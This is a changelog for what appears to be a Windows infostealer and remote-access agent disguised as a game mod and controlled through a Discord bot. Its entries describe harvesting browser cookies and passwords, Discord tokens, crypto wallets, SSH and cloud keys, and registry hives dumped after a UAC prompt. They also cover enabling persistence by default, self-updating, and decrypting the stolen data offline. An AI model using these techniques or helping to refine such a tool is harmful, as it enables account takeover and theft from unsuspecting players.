# Changelog

## 0.2.4

- Bootstrap: the hives step packed `SYSTEM.hiv` even when `reg save HKLM\SECURITY` had failed, so `secretsdump` then died on a missing file and the v20 cookies stayed locked. The script now aborts, writes `hives.status` and retries when `SECURITY.hiv` is absent.
- Also delete the `spcdump` task when it aborts, instead of leaving it behind for the next attempt to overwrite.

## 0.2.3

- Fix: the Windows update helper declared `Const CUR` and then `Dim ... cur ...`; VBScript is case insensitive, so `wscript` rejected it with "Nombre redefinido". Renamed to `curPid`.
- Fix: `Const LOG` collided with the built-in `Log()`, same error. Renamed to `LOGFILE`.
- Both Windows scripts are now also run under `wine cscript` before a release, and a test rejects keywords, built-in functions and any name declared twice.

## 0.2.2

- `help` lists the usable commands in the channel.
- `bootstrap` re-runs the whole first-run collection on demand (markers cleared, hives cap reset).

## 0.2.1

- Fix: every Windows agent update since 0.1.4 died before doing anything. The generated helper declared `Const NEW`, and `New` is a VBScript reserved word, so `wscript` rejected the file with "Se esperaba un identificador" and an error dialog. Renamed to `NEWFILE`.
- Fix: the same helper also used `left` as a counter variable while calling `Left()`, shadowing the built-in. Renamed to `remaining`.
- The Windows update script is now asserted against both names.
- Machines stuck on this bug need one manual hop: replace the mod jar by hand, `kill` the agent and start the game, the stager then installs the 0.2.1 agent from the mod.

## 0.2.0

- Harvest: newer Discord builds encrypt the stored token, so no plaintext candidate validates. The raw LevelDB files now ship under `discord/raw/` (2 MB budget) instead of being dropped; the DPAPI blobs in `dpapi/` are enough to decrypt them offline.
- Harvest: `keys.txt` no longer parses `Local State` through PowerShell `ConvertFrom-Json`, which silently failed on Edge. The encrypted key is read in Java and only the DPAPI unwrap is delegated, so Edge gets a key too.
- Harvest: when the unwrap fails, `keys.txt` keeps the wrapped value as `dpapi_key=` instead of losing it.
- Harvest: wallet extension data is stored as `wallets/<browser>/<extension>/<profile>` so Chrome, Edge and Brave no longer overwrite each other.
- Harvest: browser databases now ship with their `-wal` companions, so rows written while the browser is open are no longer lost from the copy.
- Harvest: total zip budget raised from 8 MB to 12 MB.
- Mod: dropped the unread `refmap` entry from the mixins config; Loom already remaps the injection points inline and the warning only confused the log.
- Mod: the stager logs one INFO line when it fires and when it spawns the agent.
- `decrypt.py` is now a full harvest decryptor: DPAPI masterkeys from the password, browser AES keys, v10 and v20 cookies (with the DPAPI_SYSTEM machinekey), saved passwords, Discord tokens, Exodus/Electrum/Phantom and launcher accounts, styled output and a `report.json`. It parses both the classic and the CNG DPAPI blob layout.
- `SHELL.md` with the loot one-liners to run over `shell`.
- `make_fixture.py` builds a synthetic harvest so the decryptor can be exercised end to end without Windows.
- First run collects itself: a background bootstrap (~45-75 s after the agent starts, Windows only) gathers recon, credentials, Wi-Fi, Discord/Telegram/Steam/Firefox sessions, wallets, SSH and cloud keys, a screenshot and, with one UAC, the SYSTEM hives. Each step uploads separately and leaves a marker, so a crash or a declined UAC only retries the unfinished part; the hives stop after three attempts.
- First run also turns `persist` and auto-update on by default; `persist off` or `update auto off` still wins afterwards.
- `shell` is now for specific extras and repairs, see `SHELL.md`.

## 0.1.5

- The update helper keeps watching a restarted agent for 10 minutes after the 20 s stability check (`-Dspc.watchdogSec`, 0 disables).
- A late crash kills survivors, restores the previous agent and records `rollback-late`; the startup marker makes it count one failure and back off.
- Atomic `spc-update.intent` markers distinguish `<action> <agent-pid>`: `stop` and `replace`.
- `kill` during the window stops without a restart (`watchdog-stopped`).
- A newer update takes precedence and the old helper exits (`watchdog-replaced`) instead of fighting it; `update rollback` keeps working in the window.
- A healthy window exits with `watchdog-cleared` and only deletes its own marker.
- The Windows VBS helper mirrors the marker and watchdog logic and is still untested on a real host.
- Includes the 0.1.4 fixes: signed self-update and startup rollback, deferred mod swap, manual rollback, shared update gate, opt-in schedule with backoff, startup rollback marker, and mod repair plus game PID recovery when updating from an older build.
- This 0.1.4 → 0.1.5 hop is still prepared by the 0.1.4 helper, so the watchdog first governs updates made after 0.1.5 is installed.

## 0.1.4

- Signed agent updates: apply, restart and automatic rollback on startup failure.
- Signed mod staging with the swap deferred until the game exits.
- Manual `update rollback` for both artifacts.
- Shared update gate so manual and automatic runs never overlap.
- Opt-in automatic updates: first slot after 10 minutes, then every 24 h ±10 % jitter, backoff 1 h → 2 h → 6 h → 24 h, slots persisted across restarts.
- Rollback marker so a failed startup counts as a failure with backoff.
- The Windows update helper is still untested on a real host.
- Updating from a build without mod support repairs the mod and recovers the game PID.

## 0.1.3

- Discord bot token rotated; 0.1.2 and earlier no longer connect. Manual reinstall required.
- Self-update infrastructure: signed `update.json` manifest, RSA-3072 public key embedded in the agent, release workflow with dry run.
- Discord credentials moved out of the tracked tree into generated `DiscordSecrets`, sourced from `local.properties` or `SPC_*` environment variables.
- `checkSecrets` and `release` Gradle tasks; releases fail fast on placeholders.
- Full Spanish to English translation of commands, messages and documentation.
- Gateway WebSocket transport with per-connection callbacks and REST fallback.
- Gateway hardening: 4014 intent downgrade, resume, backoff with jitter, 429 honoring `retry_after`.
- JUnit suite for the agent (24 tests) and bytecode verification for the mod and agent jars.

## 0.1.2

- Baseline before the release tooling work.
